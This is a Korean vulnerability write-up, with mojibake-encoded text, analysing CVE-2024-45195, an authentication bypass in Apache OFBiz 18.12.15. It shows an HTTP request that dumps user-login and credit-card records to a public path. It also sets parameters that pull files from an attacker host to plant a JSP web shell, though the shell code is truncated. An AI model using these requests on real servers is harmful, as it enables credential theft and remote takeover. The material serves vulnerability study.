# Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45195 (5/7)

> ğŸ”– **Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°**
> 1. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: ê°œìš” (1/7)](/Apache%20OFBiz%201-Day%20Analysis/README.md)
> 2. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-32113 (2/7)](/Apache%20OFBiz%201-Day%20Analysis/02.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-32113/README.md)
> 3. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-36104 (3/7)](/Apache%20OFBiz%201-Day%20Analysis/03.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-36104/README.md)
> 4. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-38856 (4/7)](/Apache%20OFBiz%201-Day%20Analysis/04.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-38856/README.md) 
> 5. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45195 (5/7)](/Apache%20OFBiz%201-Day%20Analysis/05.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45195/README.md) 
> 6. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-45507 (6/7)](/Apache%20OFBiz%201-Day%20Analysis/06.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-45507/README.md) 
> 7. [Apache OFBiz 1-Day ì·¨ì•½ì  ì‚´í´ë³´ê¸°: CVE-2024-47208 (7/7)](/Apache%20OFBiz%201-Day%20Analysis/07.%20Apache%20OFBiz%201-Day%20Analysis%20-%20CVE-2024-47208/README.md) 

# Introduction

ë„¤ ë²ˆì§¸ ì·¨ì•½ì ì¸ `CVE-2024-45195` ì·¨ì•½ì ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ Apache OFBiz ë²„ì „ 18.12.15 ì´í•˜ì—ì„œ ë°œìƒë˜ëŠ” ê°•ì œ ë¸Œë¼ìš°ì§•(Forced Browsing) ì·¨ì•½ì ì…ë‹ˆë‹¤.

ì´ì „ì— ë°œìƒí•œ ì„¸ ê°€ì§€ ì·¨ì•½ì (`CVE-2024-32113`, `CVE-2024-36104`, `CVE-2204-38856`)ê³¼ ë™ì¼í•˜ê²Œ URI ì²˜ë¦¬ ë©”ì»¤ë‹ˆì¦˜ì—ì„œ ì»¨íŠ¸ë¡¤ëŸ¬(Controller)ì™€ ë·°(View)ì˜ ë§¤í•‘ ì²˜ë¦¬ê³¼ì •ì—ì„œ ë°œìƒí•˜ëŠ” ì˜ëª»ëœ ì¸ì¦ ì²˜ë¦¬ë¡œ ì¸í•´ ë°œìƒë©ë‹ˆë‹¤.

ì¦‰, `requestUri` ì™€ `overrideViewrUri` ì— ëŒ€í•œ êµ¬ë¶„ëœ ì²˜ë¦¬ë¡œ ì¸í•´ ë°œìƒí•˜ëŠ” ì·¨ì•½ì ìœ¼ë¡œ ì•„ë˜ ë¶„ì„ì„ í†µí•´ ìƒì„¸íˆ ì‚´í´ë³´ê² ìŠµë‹ˆë‹¤.

> ğŸ’¿ Apache OFBiz 18.12.15 Download Link
>
> [Apache Download Mirrors - v18.12.15 Download Link](https://www.apache.org/dyn/closer.lua/ofbiz/apache-ofbiz-18.12.15.zip)

## Vulnerability Detail

| CVE | CVE-2024-45195 |
| --- | --- |
| Vulnerability | Forced Browsing |
| CVSS(3.x) | `HIGH` 7.5 |
| Product | Apache OFBiz |
| Version | <= 18.12.15 |
| Link | [`https://nvd.nist.gov/vuln/detail/CVE-2024-45195`](https://nvd.nist.gov/vuln/detail/CVE-2024-45195) |
| Description | Direct Request ('Forced Browsing') vulnerability in Apache OFBiz. This issue affects Apache OFBiz: before 18.12.16. Users are recommended to upgrade to version 18.12.16, which fixes the issue. |

# Analysis

í•´ë‹¹ `CVE-2024-45195` ì·¨ì•½ì ì—ì„œëŠ” `ProgramExport` ì— ëŒ€í•œ ì ‘ê·¼ì´ ë¶ˆê°€ëŠ¥í•˜ê¸° ë•Œë¬¸ì— ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥í•œ ë‹¤ë¥¸ ì—”ë“œí¬ì¸íŠ¸ë¥¼ ì°¾ì•„ì•¼ í•©ë‹ˆë‹¤. 

âœ… `ProgramExport.groovy` ì˜ ê¶Œí•œ ê²€ì‚¬ ë¡œì§

```groovy
if (!security.hasPermission('ENTITY_MAINT', userLogin)) {
    return
}
```

ì´ì— `EntityScreens.xml` ì—ì„œ `<script>` ë¥¼ ì¡°íšŒí•˜ë©´ ë‹¤ìŒì˜ ê²°ê³¼ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

âœ…Â /framework/webtools/widget/EntityScreens.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/EntitySQLProcessor.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/ProgramExport.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/EntityMaint.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/FindGeneric.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/ViewGeneric.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/ViewRelations.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/EntityRef.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/EntityRefList.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/CheckDb.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/EntityPerformanceTest.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/XmlDsDump.groovy"/>
<!-- ...ìƒëµ... -->
<script location="component://webtools/groovyScripts/entity/ModelInduceFromDb.groovy"/>
<!-- ...ìƒëµ... -->
```

## xmldsdump

ìœ„ì—ì„œ í™•ì¸í•œ ìŠ¤í¬ë¦½íŠ¸ ì¤‘ `XmlDsDump.groovy` ëŠ” ê¶Œí•œ ê²€ì‚¬ ë¡œì§ì´ ì¡´ì¬í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.

![images](./images/image-001.png)

ì´ì— í•´ë‹¹ ìŠ¤í¬ë¦½íŠ¸ì™€ ê´€ë ¨ëœ ì»¨íŠ¸ë¡¤ëŸ¬ë¥¼ ì‚´í´ë³´ë©´, `xmldsdump` URIê°€ ìš”ì²­ë  ë•Œ, ìŠ¤í¬ë¦° ìœ„ì ¯(`<screen name="xmldsdump">`)ì´ ë Œë”ë§ë˜ëŠ”ë° ì´ë•Œ, `XmlDsDump.groovy` ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

âœ…Â /framework/webtools/webapp/webtools/WEB-INF/controller.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<request-map uri="xmldsdump">
    <security https="true" auth="true"/>
    <response name="success" type="view" value="xmldsdump"/>
</request-map>
```

âœ…Â /framework/webtools/widget/EntityScreens.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<screen name="xmldsdump">
    <section>
        <actions>
            <property-map resource="WebtoolsUiLabels" map-name="uiLabelMap" global="true"/>
            <set field="titleProperty" value="PageTitleEntityExport"/>
            <set field="tabButtonItem" value="xmlDsDump"/>
            <set field="entityFrom" from-field="parameters.entityFrom" type="Timestamp"/>
            <set field="entityThru" from-field="parameters.entityThru" type="Timestamp"/>
            <script location="component://webtools/groovyScripts/entity/XmlDsDump.groovy"/>
        </actions>
        <widgets>
            <decorator-screen name="CommonImportExportDecorator" location="${parameters.mainDecoratorLocation}">
                <decorator-section name="body">
                    <screenlet>
                        <platform-specific><html><html-template location="component://webtools/template/entity/XmlDsDump.ftl"/></html></platform-specific>
                    </screenlet>
                </decorator-section>
            </decorator-screen>
        </widgets>
    </section>
</screen>
```

`XmlDsDump` ì„œë¹„ìŠ¤ëŠ” OFBiz í”„ë ˆì„ì›Œí¬ì— ì‚¬ìš©ë˜ëŠ” ë°ì´í„°ë² ì´ìŠ¤(ì—”í‹°í‹°)ë¥¼ íŠ¹ì • ê²½ë¡œì— XML í¬ë§·ì˜ ë°ì´í„°ë¥¼ ë‚´ë³´ë‚´ëŠ” ì„œë¹„ìŠ¤ ì…ë‹ˆë‹¤.

![images](./images/image-002.png)

ì´ ì„œë¹„ìŠ¤ë¥¼ ìš”ì²­í•  ë•Œ, ì „ì†¡ë˜ëŠ” íŒŒë¼ë¯¸í„°ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

âœ…Â `XmlDsDump` ì„œë¹„ìŠ¤ ìš”ì²­ íŒŒë¼ë¯¸í„°

| íŒŒë¼ë¯¸í„° | ì„¤ëª… |
| --- | --- |
| `outpath` | XML íŒŒì¼ì„ ì €ì¥í•  ê²½ë¡œ |
| `maxcords` | ìµœëŒ€ ë ˆì½”ë“œ ìˆ˜ |
| `filename` | ì €ì¥í•  XML íŒŒì¼ ì´ë¦„ |
| `entityFrom_i18n` | ì‹œì‘í•  ì—”í‹°í‹° ë²”ìœ„ ì§€ì • |
| `entityFrom` | íŠ¹ì • ì—”í‹°í‹° ì´ë¦„ìœ¼ë¡œë¶€í„° ë¤í”„ ì‹œì‘ |
| `entityThru_i18n` | ì¢…ë£Œí•  ì—”í‹°í‹° ë²”ìœ„ ì§€ì • |
| `entityThru` | íŠ¹ì • ì—”í‹°í‹° ì´ë¦„ê¹Œì§€ ë¤í”„ ìˆ˜í–‰ |
| `entitySyncId` | íŠ¹ì • ë™ê¸°í™” IDì— í•´ë‹¹í•˜ëŠ” ë°ì´í„°ë§Œ ë¤í”„ |
| `preConfiguredSetName` | ì‚¬ì „ ì„¤ì •ëœ ì—”í‹°í‹° ì„¸íŠ¸ |
| `entityName` | XMLë¡œ ë‚´ë³´ë‚¼ íŠ¹ì • ì—”í‹°í‹° ì´ë¦„ (ì¤‘ë³µ ê°€ëŠ¥) |

ìœ„ ìš”ì²­ íŒŒë¼ë¯¸í„°ë¥¼ ë³´ë©´ `outpath` ì— XML íŒŒì¼ì„ ì €ì¥í•  ê²½ë¡œë¥¼ ì§ì ‘ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‹¤ì‹œ ë§í•´, ì™¸ë¶€ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•œ URL ê²½ë¡œ(e.g. `js`, `css` ë¦¬ì†ŒìŠ¤ ê²½ë¡œ)ë¥¼ ì§€ì •í•˜ì—¬ ì›í•˜ëŠ” ë°ì´í„°ë¥¼ ìœ ì¶œì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, Apache OFBiz í”„ë ˆì„ì›Œí¬ì—ì„œ ì›¹ ë¦¬ì†ŒìŠ¤ ê²½ë¡œ(`jquery-3.5.1.min.js`)ëŠ” ì•„ë˜ì˜ ê²½ë¡œì— ì €ì¥ë˜ì–´ ìˆìŠµë‹ˆë‹¤.

âœ…Â Apache OFBiz í”„ë ˆì„ì›Œí¬ì—ì„œ ì›¹ ë¦¬ì†ŒìŠ¤ `jquery-3.5.1.min.js` ê°€ ì €ì¥ë˜ëŠ” ê²½ë¡œ

- Apache OFBiz í”„ë¡œì íŠ¸ ìƒ ìœ„ì¹˜(`/themes/common-theme/webapp/common/js/jquery`)
    
    ![images](./images/image-003.png)
    
- ì›¹ URL ê²½ë¡œ ìƒ ìœ„ì¹˜(`/common/js/jquery`)

![images](./images/image-004.png)

ì¦‰, `UserLogin`, `CreditCard` ì—”í‹°í‹° ì •ë³´ë¥¼ ì¶”ì¶œí•˜ê³  ì €ì¥ ê²½ë¡œë¥¼ ë¦¬ì†ŒìŠ¤ê°€ ì €ì¥ë˜ëŠ” `/themes/common-theme/webapp/common` ìœ¼ë¡œ ì§€ì •í•  ê²½ìš°, URL ìš”ì²­ì„ í†µí•´ ì¶”ì¶œëœ ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì— ëŒ€í•œ ìš”ì²­ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

âœ…Â `/webtools/control/main/xmldsdump` ìš”ì²­ íŒ¨í‚·

```
POST /webtools/control/main/xmldsdump HTTP/1.1
Host: localhost:8443
Content-Type: application/x-www-form-urlencoded
Content-Length: 210

outpath=./themes/common-theme/webapp/common&maxrecords=&filename=dump.xml&entityFrom_i18n=&entityFrom=&entityThru_i18n=&entityThru=&entitySyncId=&preConfiguredSetName=&entityName=UserLogin&entityName=CreditCard
```

ìœ„ ìš”ì²­ì— ì˜í•´ ìƒì„±ëœ `dump.xml` ì€ Apache OFBiz í”„ë ˆì„ì›Œí¬ í”„ë¡œì íŠ¸ ê²½ë¡œì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![images](./images/image-005.png)

ë˜í•œ, `/common/dump.xml` URLì„ ë¸Œë¼ìš°ì €ë¥¼ í†µí•´ ìš”ì²­í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì´ `UserLogin` ê³¼ `CreditCard` ì—”í‹°í‹° ì •ë³´ê°€ ë‹´ê¸´ íŒŒì¼ì˜ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

![images](./images/image-006.png)

ê²°ê³¼ì ìœ¼ë¡œ ìš”ì²­ URI `/webtools/control/main/xmldsdump` ë¥¼ ìš”ì²­í•  ê²½ìš° `requestUri` ëŠ” `main` ì´ë¼ ì¸ì¦ ì—†ì´ ì ‘ê·¼ ê°€ëŠ¥í•˜ë©°, ë Œë”ë§ ë˜ëŠ” ë·°ëŠ” `xmldsdump` ì´ë¯€ë¡œ, í•´ë‹¹ ë·°ê°€ ë Œë”ë§ë  ë•Œ ì‹¤í–‰ë˜ëŠ” `XmlDsDump.groovy` ìŠ¤í¬ë¦½íŠ¸ì— ì˜í•´ ì „ì†¡ë˜ëŠ” íŒŒë¼ë¯¸í„°ê°€ ì²˜ë¦¬ë˜ì–´ ì—”í‹°í‹° ì •ë³´(`entityName`ì˜ ê°’)ê°€ XML íŒŒì¼(`outpath` + `filename`)ë¡œ ìƒì„±ë©ë‹ˆë‹¤. ì´ë ‡ê²Œ ìƒì„±ëœ íŒŒì¼ì€ ì™¸ë¶€ì—ì„œ ì ‘ê·¼ ê°€ëŠ¥í•œ ê²½ë¡œì— ì €ì¥ë˜ì–´ ëˆ„êµ¬ë‚˜ ì ‘ê·¼í•  ìˆ˜ ìˆê²Œ ë˜ë¯€ë¡œ ì‹¬ê°í•œ ì •ë³´ ìœ ì¶œ ì·¨ì•½ì ì´ ë°œìƒí•©ë‹ˆë‹¤.

## viewdatafile

ë˜í•œ, `EntityScreens.xml` ë§ê³ ë„ `MiscScreens.xml` ì— ì •ì˜ëœ ìŠ¤í¬ë¦½íŠ¸ ì¤‘ ê¶Œí•œ ê²€ì‚¬ ë¡œì§ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” `ViewDataFile.groovy` ìŠ¤í¬ë¦½íŠ¸ë„ ì¡´ì¬í•©ë‹ˆë‹¤.

![images](./images/image-007.png)

ìœ„ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë‹¤ìŒê³¼ ê°™ì´ `viewdatafile` ìŠ¤í¬ë¦° ìœ„ì ¯ì´ ë·°ë¡œ ë Œë”ë§ë  ë•Œ ì‹¤í–‰ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/widget/MiscScreens.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<screen name="viewdatafile">
    <section>
        <actions>
            <set field="headerItem" value="main"/>
            <set field="titleProperty" value="WebtoolsDataFileMainTitle"/>
            <set field="tabButtonItem" value="data"/>
            <script location="component://webtools/groovyScripts/datafile/ViewDataFile.groovy"/>
        </actions>
        <widgets>
            <decorator-screen name="CommonImportExportDecorator" location="${parameters.mainDecoratorLocation}">
                <decorator-section name="body">
                    <screenlet>
                        <platform-specific><html><html-template location="component://webtools/template/datafile/ViewDataFile.ftl"/></html></platform-specific>
                    </screenlet>
                </decorator-section>
            </decorator-screen>
        </widgets>
    </section>
</screen>
```

í•´ë‹¹ ìŠ¤í¬ë¦° ìœ„ì ¯ì€ `controller.xml`ì— ì •ì˜ëœ ì»¨íŠ¸ë¡¤ëŸ¬ì˜ `viewdatafile` URIê°€ ìš”ì²­ë  ë•Œ ì°¸ì¡°ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ğŸ”Â /framework/webtools/webapp/webtools/WEB-INF/controller.xml íŒŒì¼ ë‚´ ì¼ë¶€

```xml
<!-- ìƒëµ -->
<request-map uri="viewdatafile">
    <security https="true" auth="true"/>
    <response name="success" type="view" value="viewdatafile"/>
</request-map>
<!-- ìƒëµ -->
<view-map name="viewdatafile" type="screen" page="component://webtools/widget/MiscScreens.xml#viewdatafile"/>
<!-- ìƒëµ -->
```

ì¦‰, URI ìš”ì²­ ê²½ë¡œë¥¼ `/webtools/control/main/viewdatafile` ìœ¼ë¡œ ìš”ì²­í•  ê²½ìš° ì¸ì¦ ê²€ì‚¬ëŠ” `requestUri` ì˜ ê°’(`main`)ì— ëŒ€í•œ ì¸ì¦ì„ ìˆ˜í–‰í•˜ì§€ë§Œ ì´ëŠ” í†µê³¼ë˜ê³ , ì‹¤ì œ ë·°ê°€ ë Œë”ë§ë˜ëŠ” ê²ƒì€ `overrideViewUri` ì˜ ê°’(`viewdatafile`)ì´ ë Œë”ë§ë˜ë¯€ë¡œ ì´ë•Œ,  `ViewDataFile.groovy` ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.

### ViewDataFile.groovy ìŠ¤í¬ë¦½íŠ¸ ë¶„ì„

ë‹¤ìŒì€ `ViewDataFile.groovy` ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ì— ëŒ€í•´ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤. í•´ë‹¹ ë¡œì§ì€ ì‹¤ì œ ë°ì´í„°ê°€ ë‹´ê²¨ ìˆëŠ” `DATAFILE_LOCATION` ì„ ë°ì´í„°ê°€ ì •ì˜ëœ `DEFINITION_LOCATION` ì„ ì°¸ê³ í•˜ì—¬ ë°ì´í„°ë¥¼ íŒŒì¼ë¡œ ì €ì¥í•˜ëŠ” ë¡œì§ì…ë‹ˆë‹¤.

> ìì„¸í•œ ë‚´ìš©ì€ https://github.com/apache/ofbiz-framework/blob/3bee351e39dc5d99f40081b3c5bfa365d787ed6e/framework/datafile/src/docs/asciidoc/datafiles.adoc#L70 ì„ ì°¸ê³ í•˜ì‹œê¸° ë°”ëë‹ˆë‹¤.
> 

1ï¸âƒ£Â ìš”ì²­ íŒŒë¼ë¯¸í„°ë¥¼ ê°€ì ¸ì™€ ë³€ìˆ˜ë¥¼ ì´ˆê¸°í™” í•©ë‹ˆë‹¤.

```groovy
// ì‚¬ìš©ìê°€ ì…ë ¥í•œ ë°ì´í„° íŒŒì¼ ì €ì¥ ê²½ë¡œ
dataFileSave = request.getParameter("DATAFILE_SAVE")

// ì‚¬ìš©ìê°€ ì…ë ¥í•œ ì—”í‹°í‹° XML íŒŒì¼ ì €ì¥ ê²½ë¡œ
entityXmlFileSave = request.getParameter("ENTITYXML_FILE_SAVE") 

// ë°ì´í„° íŒŒì¼ì˜ ìœ„ì¹˜
dataFileLoc = request.getParameter("DATAFILE_LOCATION")
// ë°ì´í„° ì •ì˜ íŒŒì¼ì˜ ìœ„ì¹˜
definitionLoc = request.getParameter("DEFINITION_LOCATION")
// ì‚¬ìš©í•  ë°ì´í„° ì •ì˜ì˜ ì´ë¦„
definitionName = request.getParameter("DEFINITION_NAME")
// ë°ì´í„° íŒŒì¼ì´ URLì¸ì§€ ì—¬ë¶€ 
dataFileIsUrl = null != request.getParameter("DATAFILE_IS_URL")
// ì •ì˜ íŒŒì¼ì´ URLì¸ì§€ ì—¬
definitionIsUrl = null != request.getParameter("DEFINITION_IS_URL")
```

2ï¸âƒ£Â ë°ì´í„° íŒŒì¼ ë° ì •ì˜ íŒŒì¼ ë¡œë“œ

```groovy
try {
    dataFileUrl = dataFileIsUrl?new URL(dataFileLoc):UtilURL.fromFilename(dataFileLoc)
}
catch (java.net.MalformedURLException e) {
    messages.add(e.getMessage())
}

try {
    definitionUrl = definitionIsUrl?new URL(definitionLoc):UtilURL.fromFilename(definitionLoc)
}
catch (java.net.MalformedURLException e) {
    messages.add(e.getMessage())
}
```

- `dataFileLoc`, `definitionLoc` ì˜ ê°’ì„ URL ê²½ë¡œë¡œ ë³€í™˜í•©ë‹ˆë‹¤.

3ï¸âƒ£Â ì •ì˜ íŒŒì¼ì—ì„œ ì—”í‹°í‹° ëª©ë¡ ê°€ì ¸ì˜¤ê¸°

```groovy
definitionNames = null
if (definitionUrl) {
    try {
        ModelDataFileReader reader = ModelDataFileReader.getModelDataFileReader(definitionUrl)
        if (reader) {
            definitionNames = ((Collection) reader.getDataFileNames()).iterator()
            context.put("definitionNames", definitionNames)
        }
    } catch (Exception e) {
        messages.add(e.getMessage())
    }
}
```

- `ModelDataFileReader reader = ModelDataFileReader.getModelDataFileReader(definitionUrl)`
    
    `definitionUrl` URL ê²½ë¡œì˜ íŒŒì¼ì„ `getModelDataFileReader` ë¡œ ì½ì–´ë“¤ì…ë‹ˆë‹¤.
    
- `definitionNames = ((Collection) reader.getDataFileNames()).iterator()`
    
    ì½ì–´ë“¤ì¸ íŒŒì¼(`reader`)ì— ì •ì˜ëœ ë°ì´í„° íŒŒì¼ ì´ë¦„ ëª©ë¡ì„ ê°€ì ¸ì™€ `definitionNames` ë³€ìˆ˜ë¥¼ ì´ˆê¸°í™” í•©ë‹ˆë‹¤.
    

**4ï¸âƒ£ ë°ì´í„° íŒŒì¼ ì½ê¸° ë° íŒŒì‹±**

```groovy
dataFile = null
if (dataFileUrl && definitionUrl && definitionNames) {
    try {
        dataFile = DataFile.readFile(dataFileUrl, definitionUrl, definitionName)
        context.put("dataFile", dataFile)
    } catch (Exception e) {
        messages.add(e.toString()); Debug.log(e)
    }
}
```

- `dataFile = DataFile.readFile(dataFileUrl, definitionUrl, definitionName)`
    
    ë°ì´í„° íŒŒì¼(`dataFileUrl`)ê³¼ ë°ì´í„° ì •ì˜ íŒŒì¼(`definitionUrl`)ê³¼ íŠ¹ì • ë°ì´í„° ì •ì˜(`definitionName`)ë¥¼ ì§€ì •í•˜ì—¬ ë°ì´í„°ë¥¼ `dataFile` ë³€ìˆ˜ì— ì´ˆê¸°í™”í•©ë‹ˆë‹¤.
    

5ï¸âƒ£Â ë°ì´í„° íŒŒì¼ì˜ ë©”íƒ€ ì •ë³´ë¥¼ ì €ì¥

```groovy
if (dataFile) {
    modelDataFile = dataFile.getModelDataFile()
    context.put("modelDataFile", modelDataFile)
}
```

- `context.put("modelDataFile", modelDataFile)`
    
    ë°ì´í„° íŒŒì¼(`dataFile`)ì˜ ë©”íƒ€ì •ë³´ë¥¼ ì €ì¥í•©ë‹ˆë‹¤.
    

6ï¸âƒ£Â ë°ì´í„° íŒŒì¼ ì €ì¥

```groovy
if (dataFile && dataFileSave) {
    try {
        dataFile.writeDataFile(dataFileSave)
        messages.add(uiLabelMap.WebtoolsDataFileSavedTo + dataFileSave)
    } catch (Exception e) {
        messages.add(e.getMessage())
    }
}
```

- `dataFile.writeDataFile(dataFileSave)`
    
    `dataFile` íŒŒì¼ ê°ì²´ë¥¼ `dataFileSave` ì— ì €ì¥í•©ë‹ˆë‹¤.
    

7ï¸âƒ£Â ì—”í‹°í‹° XML íŒŒì¼ ì €ì¥

```groovy
if (dataFile && entityXmlFileSave) {
    try {
        DataFile2EntityXml.writeToEntityXml(entityXmlFileSave, dataFile)
        messages.add(uiLabelMap.WebtoolsDataEntityFileSavedTo + entityXmlFileSave)
    } catch (Exception e) {
        messages.add(e.getMessage())
    }
}
```

- `DataFile2EntityXml.writeToEntityXml(entityXmlFileSave, dataFile)`
    
    ë°ì´í„° íŒŒì¼(`dataFile`)ì„ XML í˜•ì‹ìœ¼ë¡œ ë³€í™˜í•˜ì—¬ ì €ì¥í•©ë‹ˆë‹¤.
    

### ë™ì‘ í™•ì¸

ìœ„ ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ì„ ì •ë¦¬í•˜ë©´ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. ë¨¼ì €, ë‹¤ìŒê³¼ ê°™ì´ íŒŒë¼ë¯¸í„°ê°€ ì…‹íŒ…ëœ ìƒíƒœì…ë‹ˆë‹¤.

âœ…Â íŒŒë¼ë¯¸í„° ì…‹íŒ…

| íŒŒë¼ë¯¸í„° | ì˜ˆì œ ê°’ |
| --- | --- |
| `DEFINITION_LOCATION` | `http://attacker:80/test.xml` |
| `DATAFILE_LOCATION` | `http://attacker:80/test.csv` |
| `DEFINITION_NAME` | `rce` |
| `DATAFILE_SAVE` | `./applications/accounting/webapp/accounting/index.jsp` |
| `DEFINITION_IS_URL` | `true` |
| `DATAFILE_IS_URL` | `true` |

ì´ ìƒíƒœì—ì„œ `viewDataFile.groovy` ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.

âœ…Â `ViewDataFile.groovy` ìŠ¤í¬ë¦½íŠ¸ ë¡œì§ ì •ë¦¬

1. (3ï¸âƒ£) `DEFINITION_LOCATION` ì˜ ê²½ë¡œ(e.g. `http://attacker:80/test.xml`)ë¥¼ XML í¬ë§·ìœ¼ë¡œ ì½ì–´ë“¤ì—¬ ì—”í‹°í‹° ëª©ë¡ì„ `definitionNames` ë³€ìˆ˜ì— ì €ì¥í•©ë‹ˆë‹¤. 
    
    ğŸ”Â `http://attacker:80/test.xml` íŒŒì¼ ë‚´ìš©
    
    ```xml
    <data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <data-file name="rce" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
            <record name="rceentry" limit="many">
                <field name="jsp" type="String" length="605" position="0"></field>
            </record>
        </data-file>
    </data-files>
    ```
    
    ```
    definitionNames = ["<data-file name="rce" ... > ... </data-files>"]
    ```
    
2. (4ï¸âƒ£) `DATAFILE_LOCATION` ì˜ ê²½ë¡œ(e.g. `http://attacker:80/test.csv`)ë¥¼ íŒŒì¼ë¡œ ë¡œë“œí•œ ë’¤, `DEFINITION_LOCATION` ê²½ë¡œì˜ íŒŒì¼ì„ ì°¸ê³ í•˜ì—¬ `definitionName` ë³€ìˆ˜ì— ì €ì¥ëœ ê°’(`rce`)ì— í•´ë‹¹í•˜ëŠ” ë°ì´í„°ë¥¼ `dataFile` ë³€ìˆ˜ì— ì´ˆê¸°í™”í•©ë‹ˆë‹¤.
    
    ğŸ”Â `http://attacker:80/test.csv` íŒŒì¼ ë‚´ìš©(ì´ ê°’ì€ `<field name="jsp" ... length="605" position="0">` ì— ì •ì˜ëœ ëŒ€ë¡œ, 605ì ê¸¸ì´ë¥¼ ê°€ì§„ë‹¤ê³  ê°€ì •í•©ë‹ˆë‹¤.)
    
    ```xml
    <%@ page import='java.io.*' %> ...ìƒëµ... %>, // 605 ì
    ```
    
    ```
    dataFile = <%@ page import='java.io.*' %> ...ìƒëµ... %>
    ```
    
3. (6ï¸âƒ£) `dataFile` ì˜ ê°’ì„ `DATAFILE_SAVE` ì˜ ê²½ë¡œ(e.g. `./applications/accounting/webapp/accounting/index.jsp`)ë¡œ ì €ì¥í•©ë‹ˆë‹¤.
    
    ```
    cat ./applications/accounting/webapp/accounting/index.jsp
    <%@ page import='java.io.*' %> ...ìƒëµ... %>
    ```
    

ê²°ê³¼ì ìœ¼ë¡œ `ViewDataFile.groovy` ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì´ìš©í•˜ë©´, ê³µê²©ìì˜ ì™¸ë¶€ ì„œë²„ë¡œë¶€í„° ì›¹ ì‰˜ ì½”ë“œê°€ ë‹´ê¸´ CSV íŒŒì¼(`DATAFILE_LOCATION`)ê³¼ ë°ì´í„° ì •ì˜ íŒŒì¼(`DEFINITION_LOCATION`)ì„ ê°€ì ¸ì™€ì„œ Apache OFBiz í”„ë ˆì„ì›Œí¬ í”„ë¡œì íŠ¸ì— JSP íŒŒì¼(`DATAFILE_SAVE`)ë¡œ ì €ì¥í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.

